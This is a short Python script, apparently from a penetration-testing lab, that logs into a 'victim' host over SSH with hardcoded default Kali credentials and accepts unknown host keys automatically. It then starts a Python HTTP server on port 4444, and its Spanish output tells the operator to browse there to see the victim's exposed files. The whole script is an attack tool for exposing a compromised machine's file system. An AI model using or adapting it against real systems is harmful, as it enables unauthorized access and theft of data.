import paramiko

host = '192.168.1.67'
user = 'kali'
passwd = 'kali'

try:
    cliente = paramiko.SSHClient()
    cliente.load_host_keys('/home/kali/.ssh/known_hosts')
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cliente.connect(host, username=user, password=passwd)
    
    print("Debes escribir en el navegador para acceder a los archivos expuestos de la victima:", host,":4444")
    cliente.exec_command('python3 -m http.server 4444')
except Exception as e:
    print(f"Ha ocurrido un error: {e}")
